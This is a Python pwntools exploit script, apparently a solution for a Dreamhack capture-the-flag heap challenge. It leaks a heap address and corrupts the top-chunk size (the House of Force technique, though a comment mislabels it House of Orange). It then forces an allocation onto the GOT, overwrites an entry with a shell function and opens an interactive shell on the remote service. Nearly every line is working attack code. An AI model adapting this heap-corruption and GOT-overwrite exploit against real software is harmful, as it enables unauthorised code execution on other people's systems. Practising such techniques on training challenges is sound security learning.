#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 11625
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./house_of_force_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0804884C
            b* 0x0804872C
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def write(idx, idx1, val):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'idx: ', str(idx))
    p.sendlineafter(b'idx: ', str(idx1))
    p.sendlineafter(b'value: ', str(val))

# VARIABLE


# PAYLOAD
# House of Orange: ko dc
add(0x100, b'a'*8)
heap_leak = int(p.recvuntil(b':', drop=True), 16)
heap_base = heap_leak - 0x8
print("Heap base: " + hex(heap_base))
write(0, 0x41, -1)

evil_size = exe.got.system - 4*4 - (heap_base + 0x10c)
add(evil_size, b'b'*8)
add(100, flat(exe.sym.get_shell))
p.sendlineafter(b'> ', str(1))
p.sendlineafter(b'Size: ', str(10))

p.interactive()